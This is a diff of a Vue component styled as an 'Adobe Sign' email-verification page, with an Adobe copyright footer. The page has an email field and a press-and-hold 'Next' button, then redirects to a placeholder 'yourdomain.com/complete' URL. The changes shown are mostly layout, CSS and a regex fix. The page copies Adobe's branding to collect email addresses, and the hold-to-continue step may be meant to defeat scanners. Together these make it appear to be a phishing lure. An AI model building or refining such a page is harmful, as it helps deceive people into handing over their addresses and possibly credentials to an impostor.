@@ -10,37 +10,37 @@
         </div>
 
         <div class="content">
-          <p><strong>Email verification required.</strong></p> 
-          <input
-            v-model="email"
-            type="email"
-            placeholder="Enter email"
-            required
-            class="email-input"
-            :disabled="loading"
-          />
-          <p v-if="error" class="error">{{ error }}</p>
-        </div>
+          <p><strong>Email verification required.</strong></p>
+          <div class="form-wrapper">
+            <input
+              v-model="email"
+              type="email"
+              placeholder="Enter email"
+              required
+              class="email-input"
+              :disabled="loading"
+            />
+            <p v-if="error" class="error">{{ error }}</p>
 
-        <button
-          @mousedown="startHold"
-          @mouseup="endHold"
-          @mouseleave="cancelHold"
-          @touchstart.prevent="startHold"
-          @touchend.prevent="endHold"
-          :disabled="loading"
-          class="action-button"
-        >
-          {{ loading ? 'Verifying…' : 'Next' }}
-        </button>
+            <button
+              @mousedown="startHold"
+              @mouseup="endHold"
+              @mouseleave="cancelHold"
+              @touchstart.prevent="startHold"
+              @touchend.prevent="endHold"
+              :disabled="loading"
+              class="action-button"
+            >
+              {{ loading ? 'Verifying…' : 'Next' }}
+            </button>
+          </div>
+        </div>
 
         <div class="divider"></div>
 
         <div class="footer-container">
           <p class="footer-text">© 2025 Adobe. All rights reserved.</p>
-          <div class="global-footer">
-            <!-- optional global footer links here -->
-          </div>
+          <div class="global-footer"></div>
         </div>
       </div>
     </div>
@@ -58,7 +58,7 @@ const holdDuration = 1500
 const redirectBaseUrl = 'https://yourdomain.com/complete'
 
 function isValidEmail(e) {
-  return /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(e)
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
 }
 
 async function verifyEmail() {
@@ -114,37 +114,21 @@ function cancelHold() {
   justify-content: center;
   align-items: center;
   min-height: 100vh;
-  padding: 2rem;
+  padding: 1rem;
+  background-color: #f8f8f8;
   font-family: Arial, sans-serif;
-  background-color: #fff;
-}
-
-@media (prefers-color-scheme: dark) {
-  .background {
-    background-color: #1e1e1e;
-  }
-  .adobe-sign-container {
-    background-color: #2c2c2c;
-    color: #f0f0f0;
-  }
-  .email-input,
-  .action-button {
-    background-color: #3a3a3a;
-    color: #fff;
-    border-color: #555;
-  }
-  .action-button:hover:not(:disabled) {
-    background-color: #0051c3;
-  }
 }
 
 .adobe-sign-container {
   width: 100%;
-  max-width: 400px;
+  max-width: 420px;
   background: white;
   border-radius: 10px;
-  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
   padding: 2rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
 }
 
 .header {
@@ -165,27 +149,37 @@ function cancelHold() {
   color: green;
 }
 
-.content p {
-  margin: 0.5rem 0;
+.content {
+  text-align: center;
+}
+
+.form-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
 }
 
 .email-input {
   width: 100%;
-  padding: 0.5rem;
-  margin: 1rem 0;
+  max-width: 300px;
+  padding: 0.6rem;
+  margin-top: 1rem;
   border: 1px solid #ccc;
   border-radius: 5px;
+  font-size: 1rem;
 }
 
 .action-button {
   background-color: #0051c3;
   color: white;
-  padding: 0.6rem 1.2rem;
+  padding: 0.6rem 1.5rem;
   border: none;
-  border-radius: 9px;
+  border-radius: 8px;
   cursor: pointer;
-  width: 100%;
-  margin-top: 0.5rem;
+  margin-top: 1rem;
+  font-size: 1rem;
+  width: 60%;
+  max-width: 180px;
 }
 
 .action-button:disabled {
@@ -200,7 +194,7 @@ function cancelHold() {
 .divider {
   height: 1px;
   background-color: #e0e0e0;
-  margin: 1rem 0;
+  margin: 2rem 0 1rem;
 }
 
 .footer-container {
@@ -217,5 +211,6 @@ function cancelHold() {
 .error {
   color: red;
   font-size: 0.9rem;
+  margin-top: 0.5rem;
 }
 </style>
